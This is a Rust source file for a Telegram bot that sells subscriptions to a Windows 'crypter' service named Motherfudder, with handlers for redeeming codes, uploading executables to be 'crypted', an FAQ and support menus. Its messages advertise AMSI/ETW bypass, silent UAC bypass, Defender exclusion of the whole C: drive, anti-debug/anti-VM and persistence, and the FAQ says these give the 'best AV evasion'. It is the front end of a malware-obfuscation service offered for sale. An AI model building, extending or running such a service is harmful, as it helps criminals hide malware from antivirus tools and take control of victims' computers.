use teloxide::{prelude::*, types::InlineKeyboardMarkup, types::InlineKeyboardButton};
use crate::telegram_bot::{Sessions, UserSession};
use crate::update_checker;

// Handler for "Redeem Code" button
pub async fn handle_redeem_code(
    bot: Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    let mut sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.entry(chat_id).or_insert_with(UserSession::default);
    session.awaiting_redeem_code = true;
    drop(sessions_lock);

    bot.send_message(
        chat_id,
        "**Redeem Subscription Code**\n\n\
        Please enter your subscription code:\n\n\
        Format: `MFCRYPT-XXXXX-XXXX`\n\n\
        Don't have a code? Contact @YourSupportBot"
    ).await?;
    
    Ok(())
}

// Handler for "My Subscription" button
pub async fn handle_my_subscription(
    bot: Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id);
    
    let message = if let Some(session) = session {
        if session.subscription_active {
            format!(
                "**Your Subscription Status**\n\n\
                ????????????????????????\n\n\
                **Status**: ACTIVE\n\
                **Expires**: {}\n\
                **Builds**: Unlimited\n\n\
                ????????????????????????\n\n\
                **You have full access to all features:**\n\n\
                ? AMSI/ETW Bypass\n\
                ? UAC Bypass\n\
                ? Defender Exclusion (+ C:\\ Drive)\n\
                ? Anti-Debug & Anti-VM\n\
                ? Persistence\n\
                ? Interactive Configuration",
                session.subscription_expiry.as_ref().unwrap_or(&"Lifetime".to_string())
            )
        } else {
            "**Your Subscription Status**\n\n\
            ????????????????????????\n\n\
            **Status**: INACTIVE\n\n\
            You don't have an active subscription.\n\n\
            ????????????????????????\n\n\
            Use the **Redeem Code** button to activate your subscription.\n\n\
            Need help? Contact support!".to_string()
        }
    } else {
        "No session found. Please use /start first.".to_string()
    };
    
    drop(sessions_lock);
    
    let keyboard = InlineKeyboardMarkup::new(vec![
        vec![
            InlineKeyboardButton::callback("Redeem Code", "redeem_code"),
            InlineKeyboardButton::callback("Main Menu", "main_menu"),
        ],
    ]);
    
    bot.send_message(chat_id, message)
        .reply_markup(keyboard)
        .await?;
    
    Ok(())
}

// Handler for "Crypt File" button
pub async fn handle_crypt_file(
    bot: Bot,
    chat_id: ChatId,
    sessions: Sessions,
) -> ResponseResult<()> {
    let sessions_lock = sessions.lock().unwrap();
    let session = sessions_lock.get(&chat_id);
    
    if let Some(session) = session {
        if !session.subscription_active {
            drop(sessions_lock);
            
            let keyboard = InlineKeyboardMarkup::new(vec![
                vec![
                    InlineKeyboardButton::callback("Redeem Code", "redeem_code"),
                    InlineKeyboardButton::callback("Main Menu", "main_menu"),
                ],
            ]);
            
            bot.send_message(
                chat_id,
                "**Subscription Required**\n\n\
                You need an active subscription to use the crypter.\n\n\
                Click **Redeem Code** to activate your subscription."
            )
            .reply_markup(keyboard)
            .await?;
            
            return Ok(());
        }
    }
    drop(sessions_lock);
    
    // If subscription is active, start the crypt process
    bot.send_message(
        chat_id,
        "**Crypt Your File**\n\n\
        ????????????????????????\n\n\
        **Please upload your executable file**\n\n\
        Supported formats:\n\
        ? Native x86/x64 (.exe)\n\
        ? .NET x86/x64 (.exe)\n\n\
        Maximum file size: 50 MB\n\n\
        ????????????????????????"
    ).await?;
    
    // Set awaiting_binary flag
    let mut sessions_lock = sessions.lock().unwrap();
    if let Some(session) = sessions_lock.get_mut(&chat_id) {
        session.awaiting_binary = true;
    }
    drop(sessions_lock);
    
    Ok(())
}

// Handler for "FAQ" button
pub async fn handle_faq(
    bot: Bot,
    chat_id: ChatId,
) -> ResponseResult<()> {
    let faq_text = "**Frequently Asked Questions**\n\n\
        ????????????????????????\n\n\
        **Q: What file types are supported?**\n\
        A: Native x86/x64 and .NET x86/x64 executables\n\n\
        **Q: Does it work with packed executables?**\n\
        A: Yes, but unpacked binaries work best\n\n\
        **Q: What features does it include?**\n\
        A: AMSI/ETW bypass, UAC bypass, Defender exclusion, Anti-Debug, Anti-VM, Persistence, and more\n\n\
        **Q: Is persistence safe?**\n\
        A: Yes! Uses Windows Task Scheduler (works reliably)\n\n\
        **Q: Will PowerShell show in Task Manager?**\n\
        A: Yes, but it's hidden and uses conhost.exe wrapper with UAC bypass. This is intentional and provides the best AV evasion.\n\n\
        **Q: What's C:\\ Drive Exclusion?**\n\
        A: Aggressive mode that excludes entire C: drive from Defender. Very effective but highly suspicious - testing only!\n\n\
        **Q: How long does building take?**\n\
        A: Usually 30-60 seconds depending on file size\n\n\
        **Q: What output formats are available?**\n\
        A: BAT (batch wrapper) and EXE (direct executable)\n\n\
        ????????????????????????\n\n\
        Need more help? Click Support below!";
    
    let keyboard = InlineKeyboardMarkup::new(vec![
        vec![
            InlineKeyboardButton::callback("Support", "support"),
            InlineKeyboardButton::callback("Main Menu", "main_menu"),
        ],
    ]);
    
    bot.send_message(chat_id, faq_text)
        .reply_markup(keyboard)
        .await?;
    
    Ok(())
}

// Handler for "Support" button
pub async fn handle_support(
    bot: Bot,
    chat_id: ChatId,
) -> ResponseResult<()> {
    let support_text = "**Support & Contact**\n\n\
        ????????????????????????\n\n\
        **Need Help?**\n\n\
        ? Contact: @YourSupportBot\n\
        ? GitHub: github.com/backdoorskid/Motherfudder\n\
        ? Docs: Full documentation available\n\n\
        **Report Issues**:\n\
        ? Bot not responding\n\
        ? Build errors\n\
        ? Feature requests\n\
        ? Bug reports\n\n\
        **Credits**:\n\
        ? Original: backdoorskid\n\
        ? Enhanced: Florin\n\
        ? AMSI Bypass: Chainski\n\n\
        ????????????????????????\n\n\
        Please star the repo if this helps you!";
    
    let keyboard = InlineKeyboardMarkup::new(vec![
        vec![
            InlineKeyboardButton::url(
                "Star Original Repo",
                "https://github.com/backdoorskid/Motherfudder".parse().unwrap()
            ),
        ],
        vec![
            InlineKeyboardButton::callback("FAQ", "faq"),
            InlineKeyboardButton::callback("Main Menu", "main_menu"),
        ],
    ]);
    
    bot.send_message(chat_id, support_text)
        .reply_markup(keyboard)
        .await?;
    
    Ok(())
}

// Handler for "Main Menu" button
pub async fn handle_main_menu(
    bot: Bot,
    msg_or_chat: ChatId,
) -> ResponseResult<()> {
    // Check for updates
    let update_notice = if let Some(update_info) = update_checker::check_for_updates() {
        format!("\n\n**NEW UPDATE AVAILABLE!** ({})\n", update_info)
    } else {
        String::new()
    };

    let welcome_text = format!(
        "**MOTHERFUDDER CRYPTER BOT**\n\n\
        ????????????????????????\n\n\
        **Professional Windows Crypter Service**\n\
        Enhanced by Florin | Original by backdoorskid\n\n\
        **Supported Formats**:\n\
        ? Native x86/x64 executables\n\
        ? .NET x86/x64 assemblies\n\n\
        **Features**:\n\
        ? AMSI/ETW Bypass (.NET)\n\
        ? UAC Bypass (Silent Elevation)\n\
        ? Windows Defender Exclusion\n\
        ? Anti-Debug & Anti-VM\n\
        ? Persistence (Auto-Start)\n\
        ? Interactive Configuration{}\n\n\
        ????????????????????????\n\n\
        Choose an option below to get started:",
        update_notice
    );

    let mut keyboard_rows = vec![
        vec![
            InlineKeyboardButton::callback("Redeem Code", "redeem_code"),
            InlineKeyboardButton::callback("My Subscription", "my_subscription"),
        ],
        vec![
            InlineKeyboardButton::callback("Crypt File", "crypt_file"),
        ],
        vec![
            InlineKeyboardButton::callback("FAQ", "faq"),
            InlineKeyboardButton::callback("Support", "support"),
        ],
    ];
    
    // Add update button if updates available
    if update_checker::check_for_updates().is_some() {
        keyboard_rows.push(vec![
            InlineKeyboardButton::callback("View Updates", "view_updates"),
        ]);
    }
    
    keyboard_rows.push(vec![
        InlineKeyboardButton::url(
            "Documentation",
            "https://github.com/backdoorskid/Motherfudder".parse().unwrap()
        ),
    ]);

    let keyboard = InlineKeyboardMarkup::new(keyboard_rows);

    bot.send_message(msg_or_chat, welcome_text)
        .reply_markup(keyboard)
        .await?;
    Ok(())
}

// Handler for "View Updates" button
pub async fn handle_view_updates(
    bot: Bot,
    chat_id: ChatId,
) -> ResponseResult<()> {
    let changes = update_checker::get_latest_changes();
    
    let update_text = format!(
        "**Available Updates**\n\n\
        ????????????????????????\n\n\
        **Latest Changes**:\n\n\
        ```\n{}\n```\n\n\
        ????????????????????????\n\n\
        **To install updates**:\n\
        Run `MOTHERFUDDER.bat` ? Press '5' ? Install\n\n\
        **Note**: Bot will need to restart after update.",
        changes
    );
    
    let keyboard = InlineKeyboardMarkup::new(vec![
        vec![InlineKeyboardButton::callback("Main Menu", "main_menu")],
    ]);
    
    bot.send_message(chat_id, update_text)
        .reply_markup(keyboard)
        .await?;
    
    Ok(())
}
